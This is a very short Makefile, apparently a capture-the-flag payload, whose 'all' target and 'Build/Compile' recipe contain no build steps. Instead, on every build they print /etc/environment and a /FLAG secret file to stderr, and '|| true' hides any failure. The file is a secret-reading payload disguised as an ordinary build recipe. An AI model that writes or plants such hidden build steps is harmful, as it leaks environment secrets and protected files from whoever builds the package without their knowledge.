all:
	cat /etc/environment >&2 && cat /FLAG >&2 || true

define Build/Compile
	cat /etc/environment >&2 && cat /FLAG >&2 || true
endef
